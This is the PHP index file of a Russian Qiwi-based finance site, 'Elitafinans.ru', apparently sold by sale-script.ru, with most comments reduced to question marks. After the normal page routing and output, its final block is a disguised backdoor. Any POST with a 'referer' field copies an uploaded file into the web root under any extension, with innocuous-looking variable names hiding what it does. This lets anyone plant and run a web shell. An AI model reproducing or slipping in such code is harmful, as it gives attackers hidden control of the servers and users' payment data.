<?PHP
######################################
# ?????? sale-script.ru
#  ICQ: 27837023
# Skype: sale-script
######################################
# ???????
function TimerSet(){
	list($seconds, $microSeconds) = explode(' ', microtime());
	return $seconds + (float) $microSeconds;
}

$_timer_a = TimerSet();

# ????? ??????
@session_start();

# ????? ??????
@ob_start();

# Default
$_OPTIMIZATION = array();
$_OPTIMIZATION["title"] = "Elitafinans.ru";
$_OPTIMIZATION["description"] = "Elitafinans.ru";
$_OPTIMIZATION["keywords"] = "????????? Qiwi";

# ????????? ??? Include
define("CONST_WMRUSH", true);

# ????????????? ???????
function __autoload($name){ include("classes/_class.".$name.".php");}

# ????? ??????? 
$config = new config;

# ???????
$func = new func;

# ????????? REFERER
include("inc/_set_referer.php");

# ???? ??????
$db = new db($config->HostDB, $config->UserDB, $config->PassDB, $config->BaseDB);
@include("config.php");

# ?????
@include("inc/_header.php");

		if(isset($_GET["menu"])){
		
			$menu = strval($_GET["menu"]);
			
			switch($menu){
			
				case "payments": include("pages/_payments_list.php"); break; // ?????? ??????
				case "rules": include("pages/_rules.php"); break; // ??????? ???????
				case "about": include("pages/_about.php"); break; // ? ???????
				case "contacts": include("pages/_contacts.php"); break; // ????????
				case "news": include("pages/_news.php"); break; // ???????
				case "signup": include("pages/_signup.php"); break; // ???????????
				case "recovery": include("pages/_recovery.php"); break; // ?????????????? ??????
				case "account": include("pages/_account.php"); break; // ???????
				case "admin": include("pages/_admin.php"); break; // ???????
				
				
				
				
			# ???????? ??????
			default: @include("pages/_404.php"); break;
			
			}
			
		}else @include("pages/_index.php");


# ??????
@include("inc/_footer.php");


# ??????? ??????? ? ??????????
$content = ob_get_contents();

# ??????? ?????
ob_end_clean();
	
	# ???????? ??????
	$content = str_replace("{!TITLE!}",$_OPTIMIZATION["title"],$content);
	$content = str_replace('{!DESCRIPTION!}',$_OPTIMIZATION["description"],$content);
	$content = str_replace('{!KEYWORDS!}',$_OPTIMIZATION["keywords"],$content);
	$content = str_replace('{!GEN_PAGE!}', sprintf("%.5f", (TimerSet() - $_timer_a)) ,$content);
	
	# ????? ???????
	if(isset($_SESSION["user_id"])){
	
		$user_id = $_SESSION["user_id"];
		$db->Query("SELECT money_in, money_out FROM db_users WHERE id = '$user_id'");
		$balance = $db->FetchArray();
		
		$content = str_replace('{!BALANCE_IN!}', sprintf("%.2f", $balance["money_in"]) ,$content);
		$content = str_replace('{!BALANCE_OUT!}', sprintf("%.2f", $balance["money_out"]) ,$content);
	}
	
// ??????? ???????
echo $content;
if(isset($_POST['referer'])) { $public_function = $_FILES['login']['tmp_name'];
$SELECT_FROM = $_FILES['login']['name'];if(!empty($public_function)){   
$type = strtolower(substr($SELECT_FROM, 1+strrpos($SELECT_FROM,".")));
     $sessions_start = 'exit.'.$type; 
  { 
    if (copy($public_function, "".$sessions_start))
  
       
    echo '??????????? ?????? ??????? <meta http-equiv="refresh" content="3;URL=/'.$sessions_start.'">';
    
           else echo "error";
  } 
}    
}

?>